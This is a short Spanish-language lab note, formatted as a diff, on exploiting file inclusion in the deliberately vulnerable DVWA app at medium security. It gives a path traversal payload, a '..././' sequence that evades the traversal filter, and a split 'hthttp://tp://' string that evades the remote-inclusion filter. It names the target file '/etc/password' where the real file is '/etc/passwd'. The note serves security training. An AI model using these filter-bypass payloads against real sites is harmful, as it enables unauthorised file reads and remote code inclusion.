@@ -1,0 +1,27 @@
+++ Web Browser
+--- dvwa security = medium
+--- file inclusion
+--- Cambiar el url al final de la siguiente manera:
+---- ?page=../../../../../../../../../etc/password
+--- Enter
+--- La página web no varía, por ende vemos un nivel mayor de resistencia, esto
+se debe a que el código remueve los caracteres de navegación antes de que 
+los mismos sean procesados, lo que impide la navegación como tal
+--- No obstante podemos cambiar el url de la siguiente manera al final para
+poder tener la navegación pretendida:
+---- ?page=..././.././.././.././etc/password
+---- Enter
+---- En estos momentos en la parte superior de la página nos aparecerá 
+el contenido del archivo password
+--- Ahora si intentamos el cambiar la url para generar un RFI de la siguiente manera:
+---- ?page=http://google.com 
+---- Enter
+---- Veremos que no hay resultado, esto se debe a que el código fuente remueve el 
+http e impide el RFI
+---- El comportamiento anterior puede ser bypasiado de la siguiente forma:
+------ ?page=hthttp://tp://google.com
+------ Enter
+------ En estos momentos podemos observar que ahora sí google es cargado 
+en la parte superior de la página, lo que indica un RFI exitoso
+
+
